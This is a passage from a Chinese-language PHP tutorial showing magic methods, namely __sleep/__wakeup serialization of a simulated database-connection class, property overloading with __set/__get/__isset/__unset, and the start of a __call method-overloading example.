echo $calc(10, 5, '*'); // 输出：50
?>
```

#### __wakeup()和序列化

```php
<?php
class DatabaseConnection {
    private $host;
    private $username;
    private $password;
    private $connection;
    
    public function __construct($host, $username, $password) {
        $this->host = $host;
        $this->username = $username;
        $this->password = $password;
        $this->connect();
    }
    
    private function connect() {
        // 模拟数据库连接
        $this->connection = "Connected to {$this->host}";
        echo "数据库连接已建立\n";
    }
    
    public function __sleep() {
        echo "准备序列化，关闭数据库连接\n";
        // 返回需要序列化的属性
        return ['host', 'username', 'password'];
    }
    
    public function __wakeup() {
        echo "反序列化完成，重新建立数据库连接\n";
        $this->connect();
    }
    
    public function getConnection() {
        return $this->connection;
    }
}

$db = new DatabaseConnection("localhost", "root", "password");
echo $db->getConnection() . "\n";

// 序列化
$serialized = serialize($db);
echo "序列化数据: $serialized\n";

// 反序列化
$unserialized_db = unserialize($serialized);
echo $unserialized_db->getConnection() . "\n";
?>
```

### 高级魔术方法应用

#### 属性重载

```php
<?php
class DynamicProperties {
    private $data = [];
    
    public function __set($name, $value) {
        echo "设置属性 '$name' 为 '$value'\n";
        $this->data[$name] = $value;
    }
    
    public function __get($name) {
        echo "获取属性 '$name'\n";
        return isset($this->data[$name]) ? $this->data[$name] : null;
    }
    
    public function __isset($name) {
        echo "检查属性 '$name' 是否存在\n";
        return isset($this->data[$name]);
    }
    
    public function __unset($name) {
        echo "删除属性 '$name'\n";
        unset($this->data[$name]);
    }
}

$obj = new DynamicProperties();
$obj->name = "张三"; // 调用__set()
echo $obj->name . "\n"; // 调用__get()

if (isset($obj->name)) { // 调用__isset()
    echo "name属性存在\n";
}

unset($obj->name); // 调用__unset()
?>
```

#### 方法重载

```php
<?php
class FlexibleClass {
    public function __call($method, $args) {
        echo "调用了不存在的方法: $method\n";
        echo "参数: " . implode(', ', $args) . "\n";
        
        // 根据方法名动态处理
        if (strpos($method, 'get') === 0) {
            $property = strtolower(substr($method, 3));
            return "获取属性: $property";
        } elseif (strpos($method, 'set') === 0) {
            $property = strtolower(substr($method, 3));
            return "设置属性: $property 为 {$args[0]}";
        }
        
        return "未知操作";
    }